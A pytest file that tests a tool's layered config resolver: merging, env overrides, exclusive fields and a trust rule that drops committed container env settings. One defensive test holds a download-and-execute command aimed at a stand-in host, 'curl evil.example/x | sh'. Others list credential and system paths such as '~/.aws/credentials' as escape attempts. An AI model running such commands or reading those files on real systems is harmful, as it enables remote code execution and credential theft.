"""Cascade resolver: layer merging, agent-by-name merge, env vars, validation."""

from __future__ import annotations

import base64
import json
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from loguru import logger
from pydantic import BaseModel, ValidationError

from grove.core import paths as paths_mod
from grove.core.config import (
    ContainerConfig,
    DeclaredEnvVars,
    EnvReferences,
    ExclusiveGroups,
    GroveConfig,
    _deep_merge,
    _merge_agents,
    _parse_env_overrides,
    dump_schema_json,
    expand_template,
    load_config,
)
from grove.core.errors import ConfigError

# ─── deep_merge ─────────────────────────────────────────────────────────────


def test_deep_merge_last_wins_for_scalars() -> None:
    merged = _deep_merge({"x": 1}, {"x": 2})
    assert merged == {"x": 2}


def test_deep_merge_recurses_into_dicts() -> None:
    merged = _deep_merge({"a": {"b": 1, "c": 1}}, {"a": {"b": 2}})
    assert merged == {"a": {"b": 2, "c": 1}}


def test_usage_quota_profile_map_merges_by_provider_and_can_clear_one() -> None:
    base = {
        "usage": {
            "quota": {
                "profiles": {
                    "claude_code": ["/profiles/claude"],
                    "codex": ["/profiles/codex"],
                }
            }
        }
    }
    overlay = {"usage": {"quota": {"profiles": {"claude_code": []}}}}

    cfg = GroveConfig.model_validate(_deep_merge(base, overlay))

    assert cfg.usage.quota.profiles == {
        "claude_code": (),
        "codex": ("/profiles/codex",),
    }


def test_deep_merge_replaces_non_agent_lists_wholesale() -> None:
    merged = _deep_merge({"items": [1, 2, 3]}, {"items": [9]})
    assert merged == {"items": [9]}


def test_deep_merge_agents_merge_by_name() -> None:
    base = {"agents": [{"name": "a", "command": "x"}, {"name": "b", "command": "y"}]}
    overlay = {"agents": [{"name": "b", "command": "Y2"}, {"name": "c", "command": "z"}]}
    merged = _deep_merge(base, overlay)
    assert merged["agents"] == [
        {"name": "a", "command": "x"},
        {"name": "b", "command": "Y2"},
        {"name": "c", "command": "z"},
    ]


# ─── _merge_agents directly ─────────────────────────────────────────────────


def test_merge_agents_preserves_order() -> None:
    base = [{"name": "a"}, {"name": "b"}]
    overlay = [{"name": "c"}, {"name": "a"}]
    assert _merge_agents(base, overlay) == [
        {"name": "a"},
        {"name": "b"},
        {"name": "c"},
    ]


# ─── env var parsing ────────────────────────────────────────────────────────


def test_parse_env_basic() -> None:
    assert _parse_env_overrides({"GROVE_WORKTREE__BRANCH_PREFIX": "feat/"}) == {
        "worktree": {"branch_prefix": "feat/"}
    }


def test_parse_env_ignores_unrelated_vars() -> None:
    assert _parse_env_overrides({"PATH": "/", "GROVE_": "x"}) == {}


def test_parse_env_nested_two_levels() -> None:
    out = _parse_env_overrides({"GROVE_INIT_SCRIPT__TIMEOUT_SECONDS": "60"})
    assert out == {"init_script": {"timeout_seconds": "60"}}


def test_parse_env_ignores_non_config_grove_vars() -> None:
    """GROVE_* is a shared namespace; only real config fields are consumed.

    GROVE_DEBUG (the documented debug switch) and the provider token vars
    config itself names must never reach the strict model, or they hard-fail
    every config load with extra_forbidden.
    """
    out = _parse_env_overrides(
        {
            "GROVE_DEBUG": "1",
            "GROVE_GITEA_TOKEN": "tok",
            "GROVE_GITHUB_TOKEN": "tok",
            "GROVE_INSTALL_SPEC": "grove @ file:///src",
            "GROVE_UI__THEME": "grove-dark",
        }
    )
    assert out == {"ui": {"theme": "grove-dark"}}


def test_a_mistyped_section_warns_while_a_foreign_grove_var_stays_quiet(
    warnings_logged: list[str],
) -> None:
    """The carve-out stands; the silence around it does not.

    A typo one segment earlier than a field typo has the opposite outcome —
    `GROVE_TMUX__SESSON_PREFIX` raises at validation, `GROVE_TMUXX__SESSION_PREFIX`
    vanishes — and nothing can distinguish an unknown section from a foreign
    `GROVE_*` var except the `__` separator, which only a config override uses.
    """
    assert _parse_env_overrides({"GROVE_TMUXX__SESSION_PREFIX": "x-"}) == {}
    assert any("GROVE_TMUXX__SESSION_PREFIX" in m for m in warnings_logged)

    warnings_logged.clear()
    assert _parse_env_overrides({"GROVE_GITEA_TOKEN": "tok", "GROVE_DEBUG": "1"}) == {}
    assert warnings_logged == []


def test_load_config_survives_grove_debug_env(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir  # fixture used for its path-redirect side effect
    cfg = load_config(tmp_repo, env={"GROVE_DEBUG": "1", "GROVE_GITEA_TOKEN": "tok"})
    assert cfg.worktree.root_template  # defaults intact, no ConfigError


def test_project_agents_refine_builtins_instead_of_replacing(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """Built-in agents are layer 0 of the cascade.

    A project config that redeclares `claude` (the `grove config init`
    scaffold's shape) must refine the built-in — keeping kind="claude_code"
    per the `_merge_agents` contract — and must NOT hide codex/shell. A
    roster that replaced the built-ins wholesale would break the documented
    first-run flow (`config init` → create with `shell`) with "unknown
    agent" and drop claude's dashboard tracking.
    """
    del tmp_state_dir
    project = paths_mod.project_config_path(tmp_repo)
    project.parent.mkdir(parents=True, exist_ok=True)
    project.write_text(
        json.dumps({"agents": [{"name": "claude", "command": "my-claude"}]}),
        encoding="utf-8",
    )
    cfg = load_config(tmp_repo, env={})
    assert {a.name for a in cfg.agents} == {"claude", "codex", "shell"}
    claude = cfg.find_agent("claude")
    assert claude is not None
    assert claude.command == "my-claude"  # the override wins field-by-field
    assert claude.kind == "claude_code"  # inherited from the built-in base


def test_user_agent_override_inherits_builtin_kind(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """A USER config redeclaring a built-in agent by name inherits the built-in's
    unspecified fields field-wise — it must not silently drop `claude` to
    kind="generic" and kill dashboard tracking. The mechanism is the layer-0
    built-in roster resolved through field-level `_merge_agents`; this pins the
    user-layer arm (the project-layer arm is covered by
    `test_project_agents_refine_builtins_instead_of_replacing`)."""
    del tmp_state_dir
    user = paths_mod.user_config_path()
    user.parent.mkdir(parents=True, exist_ok=True)
    user.write_text(
        json.dumps({"agents": [{"name": "claude", "command": "my-claude"}]}),
        encoding="utf-8",
    )
    cfg = load_config(tmp_repo, env={})
    assert {a.name for a in cfg.agents} == {"claude", "codex", "shell"}
    claude = cfg.find_agent("claude")
    assert claude is not None
    assert claude.command == "my-claude"  # the override wins field-by-field
    assert claude.kind == "claude_code"  # inherited from the built-in base


# ─── load_config end-to-end ─────────────────────────────────────────────────


def test_load_defaults_when_no_layers(
    tmp_state_dir: Path, tmp_repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    del tmp_state_dir
    monkeypatch.delenv("GROVE_WORKTREE__BRANCH_PREFIX", raising=False)
    cfg = load_config(tmp_repo, env={})
    assert cfg.worktree.branch_prefix == "grove/"
    assert {a.name for a in cfg.agents} == {"claude", "codex", "shell"}


def test_tmux_config_has_peek_refresh_defaults() -> None:
    """Two cadences for the rail: a fast pane-only tick (~250 ms) and a
    slower full-stats tick (~3 s). Defaults are the recommended values
    from the design — users can dial them up or down.
    """
    cfg = GroveConfig.model_validate({})
    assert cfg.tmux.peek_pane_refresh_seconds == 0.25
    assert cfg.tmux.peek_stats_refresh_seconds == 3.0


def test_tmux_peek_refresh_can_be_overridden_via_layer(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    paths_mod.user_config_path().parent.mkdir(parents=True, exist_ok=True)
    paths_mod.user_config_path().write_text(
        json.dumps(
            {
                "tmux": {
                    "peek_pane_refresh_seconds": 0.5,
                    "peek_stats_refresh_seconds": 5.0,
                }
            }
        ),
        encoding="utf-8",
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.tmux.peek_pane_refresh_seconds == 0.5
    assert cfg.tmux.peek_stats_refresh_seconds == 5.0


def test_container_decor_payload_override_leaves_siblings_at_default(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """A user-layer override of one ``container.decor`` field merges field-by-field
    rather than resetting the submodel to whatever the layer's dict happened to
    carry — the same nested-submodel merge every other ``container.*`` section
    relies on.
    """
    del tmp_state_dir
    user_path = paths_mod.user_config_path()
    user_path.parent.mkdir(parents=True, exist_ok=True)
    user_path.write_text(
        json.dumps({"container": {"decor": {"payload": "/opt/grove-decor"}}}),
        encoding="utf-8",
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.decor.payload == "/opt/grove-decor"
    assert cfg.container.decor.enabled is True
    assert cfg.container.decor.statusline is True
    assert cfg.container.decor.tmux_conf is True


def test_user_layer_overrides_defaults(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    user_path = paths_mod.user_config_path()
    user_path.parent.mkdir(parents=True, exist_ok=True)
    user_path.write_text(json.dumps({"worktree": {"branch_prefix": "user/"}}), encoding="utf-8")
    cfg = load_config(tmp_repo, env={})
    assert cfg.worktree.branch_prefix == "user/"


def test_project_overrides_user(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    paths_mod.user_config_path().parent.mkdir(parents=True, exist_ok=True)
    paths_mod.user_config_path().write_text(
        json.dumps({"worktree": {"branch_prefix": "user/"}}), encoding="utf-8"
    )
    project = paths_mod.project_config_path(tmp_repo)
    project.parent.mkdir(parents=True, exist_ok=True)
    project.write_text(json.dumps({"worktree": {"branch_prefix": "team/"}}), encoding="utf-8")
    cfg = load_config(tmp_repo, env={})
    assert cfg.worktree.branch_prefix == "team/"


def test_local_overrides_project(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    project = paths_mod.project_config_path(tmp_repo)
    project.parent.mkdir(parents=True, exist_ok=True)
    project.write_text(json.dumps({"worktree": {"branch_prefix": "team/"}}), encoding="utf-8")
    local = paths_mod.project_local_config_path(tmp_repo)
    local.write_text(json.dumps({"worktree": {"branch_prefix": "me/"}}), encoding="utf-8")
    cfg = load_config(tmp_repo, env={})
    assert cfg.worktree.branch_prefix == "me/"


def test_env_overrides_all_files(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    paths_mod.user_config_path().parent.mkdir(parents=True, exist_ok=True)
    paths_mod.user_config_path().write_text(
        json.dumps({"worktree": {"branch_prefix": "user/"}}), encoding="utf-8"
    )
    cfg = load_config(tmp_repo, env={"GROVE_WORKTREE__BRANCH_PREFIX": "envwins/"})
    assert cfg.worktree.branch_prefix == "envwins/"


def test_cli_overrides_env(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    cfg = load_config(
        tmp_repo,
        env={"GROVE_WORKTREE__BRANCH_PREFIX": "envwins/"},
        cli_overrides={"worktree": {"branch_prefix": "cliwins/"}},
    )
    assert cfg.worktree.branch_prefix == "cliwins/"


def test_unknown_top_level_field_raises(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    paths_mod.user_config_path().parent.mkdir(parents=True, exist_ok=True)
    paths_mod.user_config_path().write_text(json.dumps({"unknown_field": True}), encoding="utf-8")
    with pytest.raises(ConfigError):
        load_config(tmp_repo, env={})


def test_repo_placeholder_left_literal_in_stored_value(tmp_state_dir: Path, tmp_repo: Path) -> None:
    del tmp_state_dir
    paths_mod.user_config_path().parent.mkdir(parents=True, exist_ok=True)
    paths_mod.user_config_path().write_text(
        json.dumps({"worktree": {"root_template": "${repo}/.trees"}}),
        encoding="utf-8",
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.worktree.root_template == "${repo}/.trees"


# ─── expand_template ────────────────────────────────────────────────────────


def test_expand_repo_placeholder() -> None:
    out = expand_template("${repo}/.trees", Path("/abs/repo"))
    assert out == Path("/abs/repo/.trees")


def test_expand_repo_name_placeholder() -> None:
    out = expand_template("~/grove/${repo_name}", Path("/abs/myproj"))
    assert out.name == "myproj"


# ─── round-trip ─────────────────────────────────────────────────────────────


def test_round_trip_dump_then_validate() -> None:
    cfg = GroveConfig()
    text = cfg.model_dump_json(indent=2, by_alias=True)
    again = GroveConfig.model_validate_json(text)
    assert again == cfg


# ─── mewbo section ───────────────────────────────────────────────────────────


def test_mewbo_section_defaults_and_round_trip() -> None:
    """The mewbo section validates, overrides, and survives dump→validate.
    ``api_key_env`` is the env-var NAME, never a literal secret."""
    cfg = GroveConfig.model_validate({"mewbo": {"base_url": "http://127.0.0.1:9999"}})
    assert cfg.mewbo.base_url == "http://127.0.0.1:9999"
    assert cfg.mewbo.api_key_env == "MEWBO_API_KEY"
    assert cfg.mewbo.timeout_seconds == 10.0
    again = GroveConfig.model_validate_json(cfg.model_dump_json(indent=2, by_alias=True))
    assert again.mewbo == cfg.mewbo


def test_mewbo_section_forbids_unknown_fields() -> None:
    """``extra="forbid"`` holds for the new section — a literal ``api_key``
    (the typo'd or secret-leaking shape) is rejected at validation."""
    with pytest.raises(ValidationError):
        GroveConfig.model_validate({"mewbo": {"api_key": "literal-secret"}})


def test_agent_spec_accepts_mewbo_kind() -> None:
    cfg = GroveConfig.model_validate(
        {"agents": [{"name": "mewbo", "command": "true", "kind": "mewbo"}]}
    )
    spec = cfg.find_agent("mewbo")
    assert spec is not None
    assert spec.kind == "mewbo"


# ─── tickets section ────────────────────────────────────────────────────────


def test_tickets_section_defaults_off_and_secret_free() -> None:
    """All providers default disabled; only token-env NAMES are stored, never
    a literal secret (the repo is published)."""
    cfg = GroveConfig()
    assert cfg.tickets.gitea.enabled is False
    assert cfg.tickets.github.enabled is False
    assert cfg.tickets.linear.enabled is False
    assert cfg.tickets.gitea.token_env == "GROVE_GITEA_TOKEN"
    assert cfg.tickets.github.token_env == "GROVE_GITHUB_TOKEN"
    assert cfg.tickets.linear.token_env == "GROVE_LINEAR_TOKEN"


def test_tickets_section_overrides_and_round_trip() -> None:
    cfg = GroveConfig.model_validate(
        {
            "tickets": {
                "gitea": {"enabled": True, "owner": "bearlike", "repo": "Grove"},
                "linear": {"enabled": True, "team_key": "ENG"},
            }
        }
    )
    assert cfg.tickets.gitea.enabled is True
    assert cfg.tickets.gitea.owner == "bearlike"
    assert cfg.tickets.linear.team_key == "ENG"
    again = GroveConfig.model_validate_json(cfg.model_dump_json(indent=2, by_alias=True))
    assert again.tickets == cfg.tickets


def test_tickets_section_forbids_unknown_fields() -> None:
    """``extra="forbid"`` rejects a literal ``token`` (the secret-leaking shape)."""
    with pytest.raises(ValidationError):
        GroveConfig.model_validate({"tickets": {"gitea": {"token": "literal-secret"}}})


def test_tickets_provider_layers_merge_per_field() -> None:
    """A project layer enabling a provider deep-merges over the global default."""
    base = {"tickets": {"gitea": {"owner": "bearlike", "repo": "Grove"}}}
    overlay = {"tickets": {"gitea": {"enabled": True}}}
    merged = _deep_merge(base, overlay)
    cfg = GroveConfig.model_validate(merged)
    assert cfg.tickets.gitea.enabled is True
    assert cfg.tickets.gitea.owner == "bearlike"  # base field survived the merge


# ─── telemetry section ───────────────────────────────────────────────────────


def test_telemetry_section_defaults_off_and_secret_free() -> None:
    """Disabled by default; only env-var NAMES are stored, never a literal
    secret (the repo is published) — the same discipline as `mewbo.api_key_env`."""
    cfg = GroveConfig()
    assert cfg.telemetry.enabled is False
    assert cfg.telemetry.host_env == "LANGFUSE_HOST"
    assert cfg.telemetry.public_key_env == "LANGFUSE_PUBLIC_KEY"
    assert cfg.telemetry.secret_key_env == "LANGFUSE_SECRET_KEY"
    assert cfg.telemetry.passthrough_kinds == ("claude_code", "codex")


def test_telemetry_section_forbids_unknown_fields() -> None:
    """``extra="forbid"`` rejects a literal ``secret_key`` (the secret-leaking shape)."""
    with pytest.raises(ValidationError):
        GroveConfig.model_validate({"telemetry": {"secret_key": "literal-secret"}})


def test_telemetry_section_round_trips() -> None:
    cfg = GroveConfig.model_validate(
        {
            "telemetry": {
                "enabled": True,
                "host_env": "MY_LANGFUSE_HOST",
                "passthrough_kinds": ["claude_code"],
            }
        }
    )
    again = GroveConfig.model_validate_json(cfg.model_dump_json(indent=2, by_alias=True))
    assert again.telemetry == cfg.telemetry


def test_derive_env_disabled_yields_nothing() -> None:
    cfg = GroveConfig()
    assert cfg.telemetry.derive_env({"LANGFUSE_HOST": "https://cloud.langfuse.com"}) == {}


def test_derive_env_native_trio_and_otel_headers() -> None:
    """The canonical case: all three source vars present derives the native
    trio AND the OTEL exporter pair, with the header assembled (never stored)
    from `base64(public_key:secret_key)` per the Langfuse OTEL ingestion docs."""
    cfg = GroveConfig.model_validate({"telemetry": {"enabled": True}})
    sample_env = {
        "LANGFUSE_HOST": "https://cloud.langfuse.com",
        "LANGFUSE_PUBLIC_KEY": "pk-lf-abc123",
        "LANGFUSE_SECRET_KEY": "sk-lf-xyz789",
        "UNRELATED": "ignored",
    }
    derived = cfg.telemetry.derive_env(sample_env)

    assert derived["LANGFUSE_HOST"] == "https://cloud.langfuse.com"
    assert derived["LANGFUSE_PUBLIC_KEY"] == "pk-lf-abc123"
    assert derived["LANGFUSE_SECRET_KEY"] == "sk-lf-xyz789"
    assert derived["OTEL_EXPORTER_OTLP_ENDPOINT"] == "https://cloud.langfuse.com/api/public/otel"

    expected_token = base64.b64encode(b"pk-lf-abc123:sk-lf-xyz789").decode()
    assert derived["OTEL_EXPORTER_OTLP_HEADERS"] == (
        f"Authorization=Basic {expected_token},x-langfuse-ingestion-version=4"
    )


def test_derive_env_partial_credentials_omit_otel_pair() -> None:
    """Missing the secret key: the native fields present still derive, but the
    OTEL pair (needs all three) is withheld rather than emitted half-built."""
    cfg = GroveConfig.model_validate({"telemetry": {"enabled": True}})
    derived = cfg.telemetry.derive_env(
        {"LANGFUSE_HOST": "https://cloud.langfuse.com", "LANGFUSE_PUBLIC_KEY": "pk-lf-abc123"}
    )
    assert derived == {
        "LANGFUSE_HOST": "https://cloud.langfuse.com",
        "LANGFUSE_PUBLIC_KEY": "pk-lf-abc123",
    }
    assert "OTEL_EXPORTER_OTLP_ENDPOINT" not in derived
    assert "OTEL_EXPORTER_OTLP_HEADERS" not in derived


def test_derive_env_uses_configured_env_var_names() -> None:
    """Env-var NAMES are configurable (SSM key names are TBD) — the mechanism
    reads whatever names the config points at, not hard-coded ones."""
    cfg = GroveConfig.model_validate(
        {
            "telemetry": {
                "enabled": True,
                "host_env": "PROD_LANGFUSE_HOST",
                "public_key_env": "PROD_LANGFUSE_PUBLIC_KEY",
                "secret_key_env": "PROD_LANGFUSE_SECRET_KEY",
            }
        }
    )
    derived = cfg.telemetry.derive_env(
        {
            "PROD_LANGFUSE_HOST": "https://lf.internal",
            "PROD_LANGFUSE_PUBLIC_KEY": "pk-prod",
            "PROD_LANGFUSE_SECRET_KEY": "sk-prod",
        }
    )
    assert derived["LANGFUSE_HOST"] == "https://lf.internal"
    assert derived["OTEL_EXPORTER_OTLP_ENDPOINT"] == "https://lf.internal/api/public/otel"


# ─── mutually exclusive fields across layers (init_script.inline / path) ────


def _write_layer(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


@pytest.fixture
def warnings_logged() -> Iterator[list[str]]:
    """Collect loguru WARNING messages (loguru does not reach pytest's caplog)."""
    messages: list[str] = []
    sink_id = logger.add(lambda message: messages.append(str(message)), level="WARNING")
    yield messages
    logger.remove(sink_id)


def test_local_inline_overrides_project_path(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """The real-world regression: the project layer sets `path`, the higher
    machine-local layer sets `inline`.

    A field-by-field merge kept BOTH — neither layer can clear the other's field
    — and `tmux.run_init_script` then failed every create in that repo with
    "specify either inline or path, not both". The highest layer mentioning the
    group now wins the whole group.
    """
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"init_script": {"enabled": True, "path": "scripts/init.sh"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"init_script": {"inline": "echo local"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.init_script.inline == "echo local"
    assert cfg.init_script.path is None
    assert cfg.init_script.enabled is True  # unrelated key still merged in


def test_local_path_overrides_project_inline(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """The mirror direction — the rule is precedence, not a preferred field."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"init_script": {"enabled": True, "inline": "echo project"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"init_script": {"path": "scripts/init.sh"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.init_script.path == "scripts/init.sh"
    assert cfg.init_script.inline is None


def test_single_layer_setting_both_raises_actionable_error(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """One layer naming both sources is an authoring error, not a cascade
    accident — the cross-layer pass cannot resolve it, so validation rejects it
    with a message that names both fields."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"init_script": {"enabled": True, "inline": "echo hi", "path": "scripts/init.sh"}},
    )
    with pytest.raises(ConfigError) as excinfo:
        load_config(tmp_repo, env={})
    message = str(excinfo.value)
    assert "inline" in message
    assert "path" in message
    assert "mutually exclusive" in message


def test_higher_layer_silent_on_the_group_leaves_lower_value_intact(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """No member mentioned above → nothing stripped.

    The regression this guards is far worse than the bug it fixes: an
    over-eager strip would silently disable every project's init script the
    moment any higher layer touched the section at all.
    """
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"init_script": {"enabled": True, "path": "scripts/init.sh"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"init_script": {"timeout_seconds": 90}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.init_script.path == "scripts/init.sh"
    assert cfg.init_script.timeout_seconds == 90


def test_unrelated_init_script_keys_still_merge_field_by_field(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """Only the exclusive group is resolved layer-wise; every other key in the
    same section keeps the normal field-by-field cascade."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {
            "init_script": {
                "enabled": True,
                "path": "scripts/init.sh",
                "timeout_seconds": 60,
                "fail_fast": True,
                "run_on_resume": False,
            }
        },
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"init_script": {"inline": "echo local", "fail_fast": False, "run_on_resume": True}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.init_script.inline == "echo local"
    assert cfg.init_script.path is None
    assert cfg.init_script.enabled is True  # from the lower layer
    assert cfg.init_script.timeout_seconds == 60  # from the lower layer
    assert cfg.init_script.fail_fast is False  # overridden by the higher layer
    assert cfg.init_script.run_on_resume is True  # overridden by the higher layer


def test_cross_layer_strip_is_warned(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    """Silence is what made the original bug invisible: an override that drops
    another layer's value is legal, but it must be observable."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"init_script": {"enabled": True, "path": "scripts/init.sh"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"init_script": {"inline": "echo local"}},
    )
    load_config(tmp_repo, env={})
    assert any("init_script" in msg and "'path'" in msg for msg in warnings_logged)


def test_no_warning_when_nothing_is_stripped(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    """A single layer owning the group, and lower layers silent on it, is the
    ordinary case — it must not nag."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"init_script": {"enabled": True, "path": "scripts/init.sh"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"init_script": {"timeout_seconds": 90}},
    )
    load_config(tmp_repo, env={})
    assert not [msg for msg in warnings_logged if "init_script" in msg]


def test_exclusive_resolve_does_not_mutate_its_inputs() -> None:
    """Layers come from `_read_json` / `AgentRoster.seed_layer()` and belong to
    the caller — the pre-pass copies at the level it edits."""
    lower = {"init_script": {"enabled": True, "path": "scripts/init.sh"}}
    higher = {"init_script": {"inline": "echo local"}}
    resolved = ExclusiveGroups.resolve([lower, higher])
    assert lower == {"init_script": {"enabled": True, "path": "scripts/init.sh"}}
    assert resolved[0] == {"init_script": {"enabled": True}}
    assert resolved[1] == higher


# ─── container env source: exclusivity + the committed-layer trust rule ─────


def test_container_single_layer_setting_both_env_sources_raises(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """One layer naming both sources is an authoring error the cross-layer pass
    cannot resolve — validation rejects it naming both fields."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"container": {"env_file": ".grove/container.env", "env_command": "print-env"}},
    )
    with pytest.raises(ConfigError) as excinfo:
        load_config(tmp_repo, env={})
    message = str(excinfo.value)
    assert "env_file" in message
    assert "env_command" in message
    assert "mutually exclusive" in message


def test_local_env_command_overrides_project_env_file(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """The higher layer wins the WHOLE group: a machine-local command replaces the
    project's file rather than merging into a config holding both."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"container": {"env_file": ".grove/container.env"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"container": {"env_command": "print-env"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_command == "print-env"
    assert cfg.container.env_file is None


def test_local_env_file_overrides_user_env_command(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """The mirror direction — the rule is precedence, not a preferred field."""
    del tmp_state_dir
    _write_layer(paths_mod.user_config_path(), {"container": {"env_command": "print-env"}})
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"container": {"env_file": "/opt/secrets/app.env"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_file == "/opt/secrets/app.env"
    assert cfg.container.env_command is None


def test_explicit_null_env_command_clears_a_lower_layer(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """ "Mentions" is key PRESENCE, not truthiness: an explicit null deliberately
    turns injection off for this machine instead of being a no-op."""
    del tmp_state_dir
    _write_layer(paths_mod.user_config_path(), {"container": {"env_file": "secrets/app.env"}})
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"container": {"env_command": None}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_file is None
    assert cfg.container.env_command is None


def test_committed_env_command_is_dropped_with_a_warning(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    """Honoring a committed `env_command` is remote code execution on clone: the
    repo would run a host command the moment anyone creates a workspace in it."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"container": {"env_command": "curl evil.example/x | sh"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_command is None
    assert any("env_command" in msg for msg in warnings_logged)
    # The command line can carry a token — the warning must never echo it.
    assert not any("evil.example" in msg for msg in warnings_logged)


def test_non_committed_local_layer_may_set_env_command(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """`.grove/config.local.json` is gitignored, so it is the operator speaking —
    trusted by definition, and the documented place to put the command."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"container": {"env_command": "secrets-cli export --env"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_command == "secrets-cli export --env"


def test_committed_repo_relative_env_file_is_honoured(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """The legitimate team convention: commit the path so every clone picks it up.
    It executes nothing and cannot reach outside the worktree the container
    already sees."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"container": {"env_file": ".grove/container.env"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_file == ".grove/container.env"


@pytest.mark.parametrize(
    "escaping",
    ["/etc/passwd", "~/.aws/credentials", "../../secrets.env"],
)
def test_committed_env_file_outside_the_repo_is_dropped(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str], escaping: str
) -> None:
    """A committed layer naming a host path is an exfiltration primitive a
    committed `.devcontainer/` cannot otherwise reach — the container only ever
    sees the worktree, and this would ferry anything on the box into it."""
    del tmp_state_dir
    _write_layer(paths_mod.project_config_path(tmp_repo), {"container": {"env_file": escaping}})
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_file is None
    assert any("env_file" in msg for msg in warnings_logged)


def test_committed_layer_keeps_its_other_container_keys(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """Only the two env keys are direction-limited; the rest of the section
    cascades field-by-field as usual."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"container": {"env_command": "print-env", "docker_bin": "podman"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_command is None
    assert cfg.container.docker_bin == "podman"


def test_committed_env_command_winning_the_group_leaves_no_source_at_all(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """The interaction between the two pre-passes, pinned deliberately.

    Exclusivity runs first, so the committed `env_command` wins the group and the
    user layer's `env_file` is already stripped by the time the trust rule drops
    the command. The result is NO env source — never a silent promotion of the
    operator's own setting into the slot a committed layer tried to claim. That is
    the fail-safe direction: the repo gets nothing, and nothing it did not choose
    gets used in its place.
    """
    del tmp_state_dir
    _write_layer(paths_mod.user_config_path(), {"container": {"env_file": "secrets/app.env"}})
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"container": {"env_command": "print-env"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.container.env_command is None
    assert cfg.container.env_file is None


@pytest.mark.parametrize(
    "raw",
    [".grove/container.env", "secrets/app.env", "app.env", "./a/../b.env", "..secrets.env"],
)
def test_env_file_is_contained_accepts_repo_relative_paths(raw: str) -> None:
    """Including a name that merely STARTS with dots — the check compares path
    segments, so `..secrets.env` is an ordinary filename, not an escape."""
    assert ContainerConfig.env_file_is_contained(raw) is True


@pytest.mark.parametrize(
    "raw",
    [
        "/etc/passwd",
        "~/.aws/credentials",
        "~",
        "../secrets.env",
        "a/../../secrets.env",
        "C:/secrets.env",
